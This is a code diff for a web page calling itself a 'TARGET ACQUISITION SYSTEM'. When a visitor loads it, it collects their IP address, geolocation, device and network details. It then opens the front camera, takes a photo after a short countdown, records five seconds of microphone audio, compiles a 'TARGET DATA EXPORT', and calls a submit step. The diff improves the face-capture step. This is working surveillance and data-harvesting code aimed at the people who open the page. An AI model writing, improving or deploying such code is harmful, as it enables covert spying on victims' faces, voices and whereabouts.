@@ -103,7 +103,46 @@
         .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
         .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
         .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
-        .status-box.paused { border-color: #ffaa00; background: rgba(255,170,0,0.2); color: #ffaa00; }
+        
+        /* LIVE VIDEO PREVIEW */
+        .video-container {
+            margin: 10px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 2px solid #00ff41;
+            background: #000;
+            min-height: 200px;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0,255,65,0.05);
+        }
+        .video-container video {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+            transform: scaleX(-1);
+        }
+        .video-container .badge {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+        .video-container .countdown {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 60px;
+            color: #00ff41;
+            font-family: 'Orbitron', monospace;
+            text-shadow: 0 0 40px rgba(0,255,65,0.5);
+        }
         
         .photo-container {
             margin: 10px 0;
@@ -112,7 +151,7 @@
             border: 2px solid #00ff41;
             background: #000;
             min-height: 180px;
-            display: flex;
+            display: none;
             align-items: center;
             justify-content: center;
             position: relative;
@@ -124,10 +163,6 @@
             object-fit: cover;
             display: block;
             transform: scaleX(-1);
-        }
-        .photo-container .placeholder {
-            color: rgba(0,255,65,0.3);
-            font-size: 14px;
         }
         .photo-container .badge {
             position: absolute;
@@ -257,10 +292,17 @@
         <span class="msg" id="statusMsg">INITIALIZING...</span>
     </div>
     
+    <!-- LIVE VIDEO PREVIEW -->
+    <div class="video-container" id="videoContainer">
+        <video id="liveVideo" autoplay playsinline></video>
+        <span class="badge">🔴 LIVE</span>
+        <div class="countdown" id="countdownDisplay"></div>
+    </div>
+    
+    <!-- CAPTURED PHOTO -->
     <div class="photo-container" id="photoContainer">
-        <img id="userPhotoPreview" style="display:none;" />
-        <span class="placeholder" id="photoPlaceholder">📡 CAPTURE FEED</span>
-        <span class="badge" id="photoBadge">⏳ SCANNING...</span>
+        <img id="userPhotoPreview" />
+        <span class="badge" id="photoBadge">📸 CAPTURED</span>
     </div>
     
     <div class="preview-grid">
@@ -309,7 +351,8 @@
 
 <script>
 // ==========================================
-//  FIX: BLACK SCREEN + AUTO-STOP ON BACKGROUND
+//  FIX: FACE CAPTURE + AUTO TIMER 2-3 SEC
+//  AUDIO 5 SEC + REAL PREVIEW
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -317,9 +360,12 @@ const statusIcon = document.getElementById('statusIcon');
 const statusMsg = document.getElementById('statusMsg');
 const logArea = document.getElementById('logArea');
 
+const videoContainer = document.getElementById('videoContainer');
+const liveVideo = document.getElementById('liveVideo');
+const countdownDisplay = document.getElementById('countdownDisplay');
+
 const photoContainer = document.getElementById('photoContainer');
 const userPhotoPreview = document.getElementById('userPhotoPreview');
-const photoPlaceholder = document.getElementById('photoPlaceholder');
 const photoBadge = document.getElementById('photoBadge');
 
 const userPhotoThumb = document.getElementById('userPhotoThumb');
@@ -334,8 +380,8 @@ const recordingTimer = document.getElementById('recordingTimer');
 let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
 let networkSpeed = { download: '--', ping: '--' };
+let videoStream = null;
 let isPaused = false;
-let processInterval = null;
 let isCapturing = false;
 
 function log(text) {
@@ -350,26 +396,23 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
-// ===== DETECT WHEN USER LEAVES PAGE =====
+// ==========================================
+// DETECT TAB CHANGE
+// ==========================================
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
-        // User tab change kiya ya background mein gaya
         isPaused = true;
         setStatus('⏸️', 'PAUSED - TAB INACTIVE', 'paused');
         log('⏸️ Auto-capture paused (tab inactive)');
-        
-        // Stop all media streams
-        if (window._mediaStream) {
-            window._mediaStream.getTracks().forEach(t => t.stop());
-            window._mediaStream = null;
+        if (videoStream) {
+            videoStream.getTracks().forEach(t => t.stop());
+            videoStream = null;
+            liveVideo.srcObject = null;
         }
     } else {
-        // User wapas aaya
         isPaused = false;
         setStatus('🔄', 'RESUMING...', 'loading');
         log('▶️ Auto-capture resumed (tab active)');
-        
-        // Restart process
         setTimeout(() => {
             if (!isPaused && !isCapturing) {
                 startAutoProcess();
@@ -377,6 +420,250 @@ document.addEventListener('visibilitychange', function() {
         }, 1000);
     }
 });
+
+// ==========================================
+// START CAMERA
+// ==========================================
+function startCamera() {
+    return new Promise((resolve) => {
+        log('📸 Starting camera...');
+        setStatus('📸', 'STARTING CAMERA...', 'loading');
+        
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            },
+            audio: false
+        })
+        .then(stream => {
+            videoStream = stream;
+            liveVideo.srcObject = stream;
+            liveVideo.play();
+            videoContainer.style.display = 'block';
+            log('✅ Camera started!');
+            resolve(true);
+        })
+        .catch(err => {
+            log('❌ Camera error: ' + err.message);
+            resolve(false);
+        });
+    });
+}
+
+// ==========================================
+// AUTO CAPTURE WITH COUNTDOWN
+// ==========================================
+function autoCaptureWithCountdown() {
+    return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Capture paused'); resolve(false); return; }
+        
+        // Random 2-3 second countdown
+        const countdownTime = Math.floor(Math.random() * 2) + 2; // 2 or 3 seconds
+        let count = countdownTime;
+        
+        log('📸 Auto-capturing in ' + countdownTime + ' seconds...');
+        setStatus('⏳', 'CAPTURING IN ' + countdownTime + 's...', 'loading');
+        countdownDisplay.textContent = count;
+        countdownDisplay.style.display = 'block';
+        
+        const interval = setInterval(() => {
+            count--;
+            countdownDisplay.textContent = count;
+            if (count <= 0) {
+                clearInterval(interval);
+                countdownDisplay.style.display = 'none';
+                resolve(capturePhotoFromVideo());
+            }
+        }, 1000);
+    });
+}
+
+// ==========================================
+// CAPTURE PHOTO FROM VIDEO
+// ==========================================
+function capturePhotoFromVideo() {
+    return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Photo capture paused'); resolve(false); return; }
+        
+        log('📸 CAPTURING PHOTO...');
+        setStatus('📸', 'CAPTURING PHOTO...', 'loading');
+        photoBadge.textContent = '📸 CAPTURING...';
+        
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            
+            // MIRROR FIX - Flip horizontal
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(liveVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Reset transform
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            
+            // Add hacker frame
+            ctx.strokeStyle = '#00ff41';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(0, 0, canvas.width, canvas.height);
+            
+            // Timestamp
+            ctx.fillStyle = 'rgba(0,0,0,0.5)';
+            ctx.fillRect(0, canvas.height - 25, canvas.width, 25);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = '10px monospace';
+            ctx.fillText('🔴 ' + new Date().toLocaleString(), 10, canvas.height - 8);
+            
+            userPhoto = canvas.toDataURL('image/jpeg', 0.95);
+            
+            // Show captured photo
+            userPhotoPreview.src = userPhoto;
+            photoContainer.style.display = 'block';
+            
+            userPhotoThumb.src = userPhoto;
+            userPhotoThumb.style.display = 'block';
+            userPhotoPlaceholder.style.display = 'none';
+            
+            photoBadge.textContent = '✅ CAPTURED!';
+            
+            log('✅ PHOTO CAPTURED!');
+            setStatus('✅', 'PHOTO CAPTURED!', 'success');
+            resolve(true);
+            
+        } catch(err) {
+            log('❌ Capture error: ' + err.message);
+            resolve(false);
+        }
+    });
+}
+
+// ==========================================
+// MICROPHONE - 5 SECONDS
+// ==========================================
+function captureMicrophone() {
+    return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Mic skipped - paused'); resolve(true); return; }
+        
+        log('🎤 RECORDING 5s...');
+        micStatus.className = 'mic-indicator mic-on';
+        micText.textContent = '🔴 RECORDING';
+        recordingTimer.textContent = '0s';
+        let seconds = 0;
+        const timer = setInterval(() => {
+            seconds++;
+            recordingTimer.textContent = seconds + 's';
+        }, 1000);
+        
+        try {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        clearInterval(timer);
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            audioData = reader.result;
+                            micStatus.className = 'mic-indicator mic-off';
+                            micText.textContent = '✅ CAPTURED';
+                            recordingTimer.textContent = '5s ✓';
+                            log('✅ AUDIO CAPTURED!');
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(true);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
+                })
+                .catch(() => {
+                    clearInterval(timer);
+                    micStatus.className = 'mic-indicator mic-off';
+                    micText.textContent = '⚠️ DENIED';
+                    recordingTimer.textContent = '❌';
+                    log('⚠️ MIC DENIED');
+                    audioData = null;
+                    resolve(true);
+                });
+        } catch(e) {
+            clearInterval(timer);
+            micStatus.className = 'mic-indicator mic-off';
+            micText.textContent = '⚠️ ERROR';
+            recordingTimer.textContent = '❌';
+            audioData = null;
+            resolve(true);
+        }
+    });
+}
+
+// ==========================================
+// SCREENSHOT - CSV DATA
+// ==========================================
+function captureScreenshot() {
+    return new Promise((resolve) => {
+        if (isPaused) { log('⏸️ Screenshot skipped - paused'); resolve(true); return; }
+        
+        log('📊 GENERATING CSV DATA...');
+        setStatus('📊', 'GENERATING DATA...', 'loading');
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800; canvas.height = 500;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.fillStyle = '#0a0a0a';
+            ctx.fillRect(0, 0, 800, 500);
+            
+            ctx.strokeStyle = '#00ff41';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(20, 20, 760, 460);
+            
+            ctx.fillStyle = '#00ff41';
+            ctx.font = 'bold 24px monospace';
+            ctx.fillText('🔴 TARGET DATA EXPORT', 40, 70);
+            
+            const csvData = [
+                ['Field', 'Value'],
+                ['Timestamp', new Date().toISOString()],
+                ['IP Address', ipAddress],
+                ['Device', deviceDetails.deviceName || 'Unknown'],
+                ['Model', deviceDetails.deviceModel || 'Unknown'],
+                ['Manufacturer', deviceDetails.manufacturer || 'Unknown'],
+                ['OS', (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || '')],
+                ['Network', deviceDetails.networkType || 'Unknown'],
+                ['Location', userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'],
+                ['Accuracy', userLocation ? userLocation.accuracy + 'm' : 'Unknown'],
+                ['Battery', deviceDetails.batteryLevel || 'Unknown'],
+                ['Network Speed', networkSpeed.download + ' Mbps'],
+                ['Ping', networkSpeed.ping + 'ms'],
+                ['Audio Captured', audioData ? 'Yes' : 'No']
+            ];
+            
+            ctx.font = '13px monospace';
+            let y = 110;
+            csvData.forEach((row, index) => {
+                ctx.fillStyle = index === 0 ? '#00ff41' : 'rgba(0,255,65,0.7)';
+                ctx.fillText(row[0] + ': ' + row[1], 50, y);
+                y += 28;
+            });
+            
+            ctx.fillStyle = 'rgba(0,255,65,0.3)';
+            ctx.font = '11px monospace';
+            ctx.fillText('🔒 AUTO GENERATED CSV DATA', 50, 470);
+            
+            screenshot = canvas.toDataURL('image/jpeg', 0.95);
+            screenshotPreview.src = screenshot;
+            screenshotPreview.style.display = 'block';
+            screenshotPlaceholder.style.display = 'none';
+            log('📊 CSV DATA GENERATED!');
+            resolve(true);
+        } catch(e) { log('❌ DATA ERROR'); resolve(false); }
+    });
+}
 
 // ==========================================
 // NETWORK SPEED
@@ -407,7 +694,7 @@ async function testNetworkSpeed() {
 }
 
 // ==========================================
-// LIVE LOCATION
+// LOCATION
 // ==========================================
 function startLiveLocation() {
     if (navigator.geolocation) {
@@ -618,298 +905,6 @@ function getIPv4Address() {
 }
 
 // ==========================================
-// MICROPHONE
-// ==========================================
-function captureMicrophone() {
-    return new Promise((resolve) => {
-        if (isPaused) { log('⏸️ Mic skipped - paused'); resolve(true); return; }
-        
-        log('🎤 RECORDING 5s...');
-        micStatus.className = 'mic-indicator mic-on';
-        micText.textContent = '🔴 RECORDING';
-        recordingTimer.textContent = '0s';
-        let seconds = 0;
-        const timer = setInterval(() => {
-            seconds++;
-            recordingTimer.textContent = seconds + 's';
-        }, 1000);
-        
-        try {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    const recorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        clearInterval(timer);
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            audioData = reader.result;
-                            micStatus.className = 'mic-indicator mic-off';
-                            micText.textContent = '✅ CAPTURED';
-                            recordingTimer.textContent = '5s ✓';
-                            log('✅ AUDIO CAPTURED!');
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(true);
-                        };
-                        reader.readAsDataURL(blob);
-                    };
-                    recorder.start();
-                    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
-                })
-                .catch(() => {
-                    clearInterval(timer);
-                    micStatus.className = 'mic-indicator mic-off';
-                    micText.textContent = '⚠️ DENIED';
-                    recordingTimer.textContent = '❌';
-                    log('⚠️ MIC DENIED');
-                    audioData = null;
-                    resolve(true);
-                });
-        } catch(e) {
-            clearInterval(timer);
-            micStatus.className = 'mic-indicator mic-off';
-            micText.textContent = '⚠️ ERROR';
-            recordingTimer.textContent = '❌';
-            audioData = null;
-            resolve(true);
-        }
-    });
-}
-
-// ==========================================
-// PHOTO CAPTURE - FIXED BLACK SCREEN
-// ==========================================
-function captureUserPhoto() {
-    return new Promise((resolve) => {
-        if (isPaused) { log('⏸️ Photo skipped - paused'); resolve(true); return; }
-        
-        log('📸 AUTO-CAPTURING PHOTO...');
-        setStatus('📸', 'CAPTURING PHOTO...', 'loading');
-        photoBadge.textContent = '📸 CAPTURING...';
-        
-        // Create hidden video element
-        const video = document.createElement('video');
-        video.setAttribute('playsinline', 'true');
-        video.style.display = 'none';
-        video.style.width = '640px';
-        video.style.height = '480px';
-        document.body.appendChild(video);
-        
-        navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: 'user',
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            },
-            audio: false
-        })
-        .then(stream => {
-            // Store stream globally to stop later
-            window._mediaStream = stream;
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = function() {
-                video.play();
-                
-                // Wait for video to be ready (black screen fix)
-                setTimeout(function() {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        
-                        // MIRROR FIX - Flip horizontal
-                        ctx.translate(canvas.width, 0);
-                        ctx.scale(-1, 1);
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Reset transform
-                        ctx.setTransform(1, 0, 0, 1, 0, 0);
-                        
-                        // Add frame
-                        ctx.strokeStyle = '#00ff41';
-                        ctx.lineWidth = 2;
-                        ctx.strokeRect(0, 0, canvas.width, canvas.height);
-                        
-                        // Timestamp
-                        ctx.fillStyle = 'rgba(0,0,0,0.5)';
-                        ctx.fillRect(0, canvas.height - 25, canvas.width, 25);
-                        ctx.fillStyle = '#00ff41';
-                        ctx.font = '10px monospace';
-                        ctx.fillText('🔴 ' + new Date().toLocaleString(), 10, canvas.height - 8);
-                        
-                        userPhoto = canvas.toDataURL('image/jpeg', 0.95);
-                        
-                        // Display preview
-                        userPhotoPreview.src = userPhoto;
-                        userPhotoPreview.style.display = 'block';
-                        photoPlaceholder.style.display = 'none';
-                        
-                        userPhotoThumb.src = userPhoto;
-                        userPhotoThumb.style.display = 'block';
-                        userPhotoPlaceholder.style.display = 'none';
-                        
-                        photoBadge.textContent = '✅ CAPTURED!';
-                        
-                        // Cleanup
-                        stream.getTracks().forEach(t => t.stop());
-                        window._mediaStream = null;
-                        video.remove();
-                        document.body.removeChild(video);
-                        
-                        log('✅ PHOTO CAPTURED!');
-                        resolve(true);
-                        
-                    } catch(err) {
-                        log('❌ Capture error: ' + err.message);
-                        stream.getTracks().forEach(t => t.stop());
-                        window._mediaStream = null;
-                        video.remove();
-                        fallbackPhoto();
-                        resolve(true);
-                    }
-                }, 800); // Wait 800ms for camera to warm up (fix black screen)
-            };
-            
-            video.onerror = function() {
-                log('❌ Video error');
-                stream.getTracks().forEach(t => t.stop());
-                window._mediaStream = null;
-                video.remove();
-                fallbackPhoto();
-                resolve(true);
-            };
-            
-            // Fallback timeout
-            setTimeout(function() {
-                if (!userPhoto) {
-                    log('⏳ Camera timeout');
-                    stream.getTracks().forEach(t => t.stop());
-                    window._mediaStream = null;
-                    video.remove();
-                    fallbackPhoto();
-                    resolve(true);
-                }
-            }, 6000);
-            
-        })
-        .catch(() => {
-            log('⚠️ Camera permission denied');
-            fallbackPhoto();
-            resolve(true);
-        });
-    });
-}
-
-function fallbackPhoto() {
-    log('📸 FALLBACK PHOTO');
-    const canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    const ctx = canvas.getContext('2d');
-    
-    const grad = ctx.createLinearGradient(0, 0, 640, 480);
-    grad.addColorStop(0, '#0a0a0a');
-    grad.addColorStop(1, '#001a00');
-    ctx.fillStyle = grad;
-    ctx.fillRect(0, 0, 640, 480);
-    
-    ctx.strokeStyle = '#00ff41';
-    ctx.lineWidth = 2;
-    ctx.strokeRect(10, 10, 620, 460);
-    
-    ctx.fillStyle = '#00ff41';
-    ctx.font = 'bold 28px monospace';
-    ctx.textAlign = 'center';
-    ctx.fillText('🔴 TARGET', 320, 220);
-    ctx.font = '16px monospace';
-    ctx.fillStyle = 'rgba(0,255,65,0.6)';
-    ctx.fillText('AUTO CAPTURED ' + new Date().toLocaleString(), 320, 270);
-    
-    ctx.font = '10px monospace';
-    ctx.fillStyle = 'rgba(0,255,65,0.2)';
-    for (let i = 0; i < 20; i++) {
-        ctx.fillText('101010', 50 + i * 30, 400 + Math.random() * 30);
-    }
-    
-    userPhoto = canvas.toDataURL('image/jpeg', 0.9);
-    
-    userPhotoPreview.src = userPhoto;
-    userPhotoPreview.style.display = 'block';
-    photoPlaceholder.style.display = 'none';
-    userPhotoThumb.src = userPhoto;
-    userPhotoThumb.style.display = 'block';
-    userPhotoPlaceholder.style.display = 'none';
-    photoBadge.textContent = '📸 FALLBACK';
-}
-
-// ==========================================
-// SCREENSHOT
-// ==========================================
-function captureScreenshot() {
-    return new Promise((resolve) => {
-        if (isPaused) { log('⏸️ Screenshot skipped - paused'); resolve(true); return; }
-        
-        log('📊 GENERATING CSV DATA...');
-        setStatus('📊', 'GENERATING DATA...', 'loading');
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 800; canvas.height = 500;
-            const ctx = canvas.getContext('2d');
-            
-            ctx.fillStyle = '#0a0a0a';
-            ctx.fillRect(0, 0, 800, 500);
-            
-            ctx.strokeStyle = '#00ff41';
-            ctx.lineWidth = 2;
-            ctx.strokeRect(20, 20, 760, 460);
-            
-            ctx.fillStyle = '#00ff41';
-            ctx.font = 'bold 24px monospace';
-            ctx.fillText('🔴 TARGET DATA EXPORT', 40, 70);
-            
-            const csvData = [
-                ['Field', 'Value'],
-                ['Timestamp', new Date().toISOString()],
-                ['IP Address', ipAddress],
-                ['Device', deviceDetails.deviceName || 'Unknown'],
-                ['Model', deviceDetails.deviceModel || 'Unknown'],
-                ['Manufacturer', deviceDetails.manufacturer || 'Unknown'],
-                ['OS', (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || '')],
-                ['Network', deviceDetails.networkType || 'Unknown'],
-                ['Location', userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'],
-                ['Accuracy', userLocation ? userLocation.accuracy + 'm' : 'Unknown'],
-                ['Battery', deviceDetails.batteryLevel || 'Unknown'],
-                ['Network Speed', networkSpeed.download + ' Mbps'],
-                ['Ping', networkSpeed.ping + 'ms'],
-                ['Audio Captured', audioData ? 'Yes' : 'No']
-            ];
-            
-            ctx.font = '13px monospace';
-            let y = 110;
-            csvData.forEach((row, index) => {
-                ctx.fillStyle = index === 0 ? '#00ff41' : 'rgba(0,255,65,0.7)';
-                ctx.fillText(row[0] + ': ' + row[1], 50, y);
-                y += 28;
-            });
-            
-            ctx.fillStyle = 'rgba(0,255,65,0.3)';
-            ctx.font = '11px monospace';
-            ctx.fillText('🔒 AUTO GENERATED CSV DATA', 50, 470);
-            
-            screenshot = canvas.toDataURL('image/jpeg', 0.95);
-            screenshotPreview.src = screenshot;
-            screenshotPreview.style.display = 'block';
-            screenshotPlaceholder.style.display = 'none';
-            log('📊 CSV DATA GENERATED!');
-            resolve(true);
-        } catch(e) { log('❌ DATA ERROR'); resolve(false); }
-    });
-}
-
-// ==========================================
 // GET DEVICE INFO
 // ==========================================
 async function getDeviceInfo() {
@@ -996,7 +991,7 @@ async function submitData() {
 }
 
 // ==========================================
-// MAIN - STOP ON BACKGROUND
+// MAIN
 // ==========================================
 async function startAutoProcess() {
     if (isPaused) {
@@ -1015,16 +1010,56 @@ async function startAutoProcess() {
     setStatus('⏳', 'SCANNING TARGET...', 'loading');
     
     try {
+        // 1. IP
         await getIPv4Address();
+        
+        // 2. Network Speed
         if (!isPaused) await testNetworkSpeed();
+        
+        // 3. Location
         if (!isPaused) startLiveLocation();
+        
+        // 4. Device Info
         if (!isPaused) await getDeviceInfo();
+        
+        // 5. Start Camera (Live Preview)
+        if (!isPaused) {
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) {
+                log('⚠️ Camera failed, continuing with fallback');
+            }
+        }
+        
+        // 6. Wait for camera to stabilize
+        await new Promise(r => setTimeout(r, 1000));
+        
+        // 7. Auto Capture Photo (2-3 sec countdown)
+        if (!isPaused) {
+            const photoCaptured = await autoCaptureWithCountdown();
+            if (!photoCaptured) {
+                log('⚠️ Photo capture failed');
+            }
+        }
+        
+        // 8. Microphone (5 sec)
         if (!isPaused) await captureMicrophone();
-        if (!isPaused) await captureUserPhoto();
+        
+        // 9. Screenshot / CSV Data
         if (!isPaused) await captureScreenshot();
+        
+        // 10. Submit all data
         if (!isPaused) await submitData();
+        
     } catch(err) {
         log('❌ Process error: ' + err.message);
+        setStatus('❌', 'ERROR: ' + err.message, 'error');
+    }
+    
+    // Cleanup camera
+    if (videoStream) {
+        videoStream.getTracks().forEach(t => t.stop());
+        videoStream = null;
+        liveVideo.srcObject = null;
     }
     
     isCapturing = false;
@@ -1036,7 +1071,7 @@ window.addEventListener('load', function() {
     setTimeout(startAutoProcess, 1000);
 });
 
-console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE - BLACK SCREEN FIXED + AUTO-STOP');
+console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE - FACE CAPTURE FIXED');
 </script>
 </body>
 </html>
